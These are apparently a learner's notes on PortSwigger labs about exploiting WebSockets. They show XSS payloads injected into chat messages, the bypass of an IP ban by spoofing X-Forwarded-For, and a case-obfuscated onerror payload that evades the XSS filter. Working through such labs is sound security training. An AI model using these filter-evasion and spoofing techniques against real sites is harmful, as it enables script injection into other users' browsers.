### Manipulating WebSocket messages to exploit vulnerabilities

### Lab: Manipulating WebSocket messages to exploit vulnerabilities
Interesting: browser HTMLEncodes our input but server does not, we can intercept (in bupr) and modify out input which later might result in xss

So we send the following to the server:
```bash
{"message":"<img src=1 onerror='alert(1)'>"}
```
And we get alert(1) executed

## Manipulating the WebSocket handshake to exploit vulnerabilities
Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:
- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities 
This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 

So we try to send:
```bash
{"message":"<img src=1 onerror='alert(1)'>"}
```
And we get back:
```bash
{"error":"Attack detected: Event handler"}
```
The attack has been blocked, and that our WebSocket connection has been terminated.

So we try to send another websocket handshake request to the server, to initiate another websocket connection:
```bash
GET /chat HTTP/2
Host: 0a3300a703cf7ada809303a800d0003d.web-security-academy.net
Sec-Websocket-Version: 13
Origin: https://0a3300a703cf7ada809303a800d0003d.web-security-academy.net
Sec-Websocket-Key: bANkYjofdpoWYUmEAgpByw==
Cookie: session=8CtoWqst0hEW3Ea5Xc64sg4XObNcaf78
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Upgrade: websocket
```
But we get back:
```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 29

"This address is blacklisted"
```
BTW when we click "Reconnect" in Burp repeater - it also sends the same http handshake req that is shown above and we also observe that the connection attempt fails because our IP address has been banned, i.e. we get the same 401 Unauthorized response.

The solution is simple, we can use `X-Forwarded-For` to spoof our IP.
So we go to repeater, click `Reconnect` and add the following header:
```
X-Forwarded-For: 1.1.1.1
```
We're connected, let's now obfuscate our xss payload:
```bash
<img src=1 oNeRrOr=alert`1`>
```
And success!

### Cross-site WebSocket hijacking

